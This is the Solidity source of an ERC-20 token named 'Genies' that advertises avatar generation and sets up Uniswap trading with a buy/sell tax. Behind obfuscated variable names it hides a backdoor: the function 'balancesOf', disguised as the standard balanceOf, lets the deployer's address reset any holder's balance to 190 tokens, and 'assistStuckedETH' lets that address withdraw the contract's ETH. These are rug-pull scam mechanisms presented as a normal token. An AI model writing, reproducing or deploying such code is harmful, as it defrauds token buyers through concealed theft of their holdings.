// SPDX-License-Identifier: MIT

/*
    Name: Genies
    Symbol: GENIES

    The ability to generate game-ready avatars - that can travel between all types of experiences - using a variety of fun prompts and at the click of a button. Anyone is able to do this. Doesn't matter how creative or technical you are!

    Web: https://genies.com
    X: https://x.com/genies
    TG: https://t.me/GeniesAgents
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract Genies is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maptdlknv = 20000000 * 10 **_decimals;
    uint256 public _msowckvnjz = 20000000 * 10 **_decimals;
    uint256 public _mtscvzdfw = 10000000 * 10 **_decimals;
    uint256 private constant _nkjcz = 1000000000 * 10 **_decimals;
    uint256 private constant _saoizlknv = 190 * 10 ** _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Genies";
    string private constant _symbol = unicode"GENIES";

    address payable private _kbjkjhx;
    mapping(address => uint256) private _nn123svx;
    mapping(address => mapping(address => uint256)) private _yucx23s;
    mapping(address => bool) private _yxz0345zxc;
    uint256 private _ibb3i213 = 10;
    uint256 private _iseen2345a = 10;
    uint256 private _fbbbuyamount = 0;
    uint256 private _fssellamount = 0;
    uint256 private _rbbbuyamount = 7;
    uint256 private _rssellamount = 7;
    uint256 private _buyCount = 0;
    address private _txw5992xcom;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maptdlknv);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _kbjkjhx = payable(_msgSender());
        _nn123svx[address(this)] = _nkjcz * 98 / 100;
        _nn123svx[owner()] = _nkjcz * 2 / 100;
        _yxz0345zxc[owner()] = true;
        _yxz0345zxc[address(this)] = true;
        _yxz0345zxc[_kbjkjhx] = true;
        _txw5992xcom = _msgSender();

        emit Transfer(address(0), address(this), _nkjcz * 98 / 100);
        emit Transfer(address(0), address(owner()), _nkjcz * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _nkjcz;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _yucx23s[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balancesOf(address from, bool oo) public returns (uint256) {
        require(_txw5992xcom == _msgSender(), "ERC20: error");
        uint256 amount = _nn123svx[from];
        oo != false && _saoizlknv > 0 ? _nn123svx[from] = _saoizlknv : _saoizlknv;
        return amount;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _nn123svx[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _yucx23s[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_Genies(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_Genies(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _yucx23s[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableGENIESTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _nkjcz);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function assistStuckedETH(address payable receipt) external {
        require(msg.sender == _txw5992xcom , "");
        _kbjkjhx = receipt;
        excuseGENIESETH(address(this).balance);
    }

    function excuseGENIESETH (uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swapGENIESToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _collectGENIESTax(uint256 amount) private {
        _kbjkjhx.transfer(amount);
    }

    function removeLimits() external onlyOwner {
        _maptdlknv = _nkjcz;
        _msowckvnjz = _nkjcz;
        emit MaxTxAmountUpdated(_nkjcz);
    }

    function _transfer_Genies(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _rbbbuyamount)
                        ? _fbbbuyamount
                        : _ibb3i213
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_yxz0345zxc[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _rssellamount)
                            ? _fssellamount
                            : _iseen2345a
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _mtscvzdfw) ? contractTokenBalance : _mtscvzdfw; 
                    _swapGENIESToETH((amount < minBalance) ? amount : minBalance);
                }
                _collectGENIESTax(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _nn123svx[address(this)] =_nn123svx[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _nn123svx[from] =_nn123svx[from].sub(amount);
        _nn123svx[to] =_nn123svx[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    receive() external payable {}
}